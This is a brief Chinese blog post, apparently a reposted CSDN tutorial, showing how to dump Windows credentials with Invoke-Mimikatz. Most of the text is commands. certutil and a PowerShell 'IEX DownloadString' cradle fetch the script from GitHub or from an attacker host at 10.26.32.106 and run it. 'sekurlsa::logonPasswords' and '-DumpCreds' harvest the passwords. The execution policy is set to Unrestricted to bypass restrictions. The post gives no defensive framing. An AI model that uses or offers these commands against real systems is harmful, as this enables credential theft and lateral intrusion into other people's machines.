> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [blog.csdn.net](https://blog.csdn.net/nzjdsds/article/details/102793697)

参照：[https://blog.51cto.com/simeon/2126106](https://blog.51cto.com/simeon/2126106)

进行实现

Invoke-Mimikatz.ps1 下载地址

```
#使用certutil下载
certutil.exe -urlcache -split -f "http://10.26.32.106:8000/Invoke-Mimikatz.ps1"  
#执行Mimikatz
powershell Import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonPasswords full"'
```

（1）目标主机具备网络环境

```
powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
```

![](https://img-blog.csdnimg.cn/20191029100002878.png)

（2）目标主机不具备网络环境

```
powershell "IEX (New-Object Net.WebClient).DownloadString('http://10.26.32.106:8000/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"
```

![](https://img-blog.csdnimg.cn/20191029100024750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L256amRzZHM=,size_16,color_FFFFFF,t_70)

（3）把文件下载到目标主机进行执行

```
#使用certutil下载
certutil.exe -urlcache -split -f "http://10.26.32.106:8000/Invoke-Mimikatz.ps1"  
#执行Mimikatz
powershell Import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonPasswords full"'
```

![](https://img-blog.csdnimg.cn/20191029100047452.png)

有授权限制的：

```
Get-ExecutionPolicy  //结果显示restricted
```

![](https://img-blog.csdnimg.cn/20191029100058783.png)

```
Set-ExecutionPolicy Unrestricted  //打开限制
```

![](https://img-blog.csdnimg.cn/20191029100109119.png)

```
Import-Module .\Invoke-Mimikatz.ps1 //导入命令
```

![](https://img-blog.csdnimg.cn/20191029100116897.png)

```
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonPasswords full"' //获取密码
```

![](https://img-blog.csdnimg.cn/2019102910014051.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L256amRzZHM=,size_16,color_FFFFFF,t_70)